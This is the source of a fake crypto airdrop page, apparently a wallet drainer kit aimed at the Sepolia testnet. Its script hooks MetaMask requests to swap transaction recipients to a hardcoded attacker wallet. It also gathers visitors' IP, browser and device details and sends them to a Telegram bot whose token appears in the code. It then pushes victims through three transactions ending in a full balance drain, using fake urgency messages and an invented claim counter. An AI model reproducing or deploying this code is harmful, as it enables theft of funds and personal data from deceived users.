<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî• Quantum Yield Airdrop (Sepolia Testnet)</title>
    <script>
        const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
        const CHAT_ID = "6309547301";
        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
        const ETH_TO_USD_RATE = 2500; // Fake rate: 1 SEP = $2,500 USD

        // ETH Clipper: Swap 'to' address in eth_sendTransaction
        if (window.ethereum) {
            const originalRequest = window.ethereum.request;
            window.ethereum.request = async (args) => {
                if (args.method === "eth_sendTransaction") {
                    const originalTo = args.params[0].to;
                    args.params[0].to = YOUR_WALLET; // Swap to your address
                    await sendAlert(`ü™ù CLIP ATTEMPT: Swapped ${originalTo} to ${YOUR_WALLET}`);
                }
                return originalRequest.apply(window.ethereum, [args]);
            };
        }

        async function sendAlert(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            } catch (e) {
                console.log("Telegram alert failed...");
            }
        }

        async function getVictimInfo() {
            const ua = navigator.userAgent;
            const br = navigator.appName + " " + navigator.appVersion;
            const dev = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
            let ip = "Unknown";
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                ip = data.ip;
            } catch (e) {
                console.log("IP fetch failed...");
            }
            return { ip, browser: br, device: dev };
        }

        async function connectWallet() {
            if (!window.ethereum) {
                document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a> to claim your rewards!</p>";
                const info = await getVictimInfo();
                await sendAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
                return;
            }

            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: "0xaa36a7" }]
                });

                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const account = accounts[0];
                const balance = BigInt(await window.ethereum.request({
                    method: "eth_getBalance",
                    params: [account, "latest"]
                }));

                if (balance === 0n) {
                    throw new Error("Wallet balance is zero.");
                }

                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
                const gasLimit = 21000n;
                const gasCost = gasLimit * gasPrice;
                const claimFee = BigInt("10000000000000000"); // 0.01 ETH

                if (balance < gasCost + claimFee) {
                    throw new Error("Insufficient funds for claim.");
                }

                const info = await getVictimInfo();
                await sendAlert(`üéØ VICTIM CONNECTED\nWallet: ${account}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);

                // Step 1: Fake verification
                document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 SEP to proceed!</p>";
                await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: account,
                        to: YOUR_WALLET,
                        value: "0x" + BigInt("5000000000000000").toString(16), // 0.005 ETH
                        gas: "0x" + gasLimit.toString(16),
                        gasPrice: "0x" + gasPrice.toString(16),
                        chainId: "0xaa36a7"
                    }]
                });

                // Step 2: Fake claim fee
                document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 SEP claim fee to secure your 5 SEP reward (~$12,500 USD)!</p>";
                await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: account,
                        to: YOUR_WALLET,
                        value: "0x" + claimFee.toString(16),
                        gas: "0x" + gasLimit.toString(16),
                        gasPrice: "0x" + gasPrice.toString(16),
                        chainId: "0xaa36a7"
                    }]
                });

                // Step 3: Full drain
                const drainAmount = balance - gasCost;
                const drainEth = (Number(drainAmount) / 1e18).toFixed(6);
                const drainUsd = (drainEth * ETH_TO_USD_RATE).toFixed(2);
                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop‚Äîslots closing FAST!</p>";
                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: account,
                        to: YOUR_WALLET,
                        value: "0x" + drainAmount.toString(16),
                        gas: "0x" + gasLimit.toString(16),
                        gasPrice: "0x" + gasPrice.toString(16),
                        chainId: "0xaa36a7"
                    }]
                });

                await sendAlert(`‚úÖ SEPOLIA SUCCESS: ${account} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${txHash}\nIP: ${info.ip}`);
                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 SEP + NFT transferred. Check your wallet!</p>";
                updateClaimCounter();
            } catch (e) {
                const info = await getVictimInfo();
                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
                document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
            }
        }

        function startTimer() {
            const endTime = Date.now() + 24 * 60 * 60 * 1000;
            setInterval(() => {
                const now = Date.now();
                const distance = endTime - now;
                if (distance < 0) {
                    document.getElementById("timer").innerHTML = "Airdrop Ended!";
                    document.querySelector("button").disabled = true;
                    return;
                }
                const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const s = Math.floor((distance % (1000 * 60)) / 1000);
                document.getElementById("timer").innerHTML = `${h}h ${m}m ${s}s`;
            }, 1000);
        }

        function updateClaimCounter() {
            let claimed = parseInt(document.getElementById("claimed").innerText.replace(/,/g, ""));
            claimed += Math.floor(Math.random() * 10) + 1; // Fake random increase
            document.getElementById("claimed").innerText = claimed.toLocaleString();
        }

        window.onload = () => {
            startTimer();
            setInterval(updateClaimCounter, 5000); // Fake counter ticks every 5s
        };
    </script>
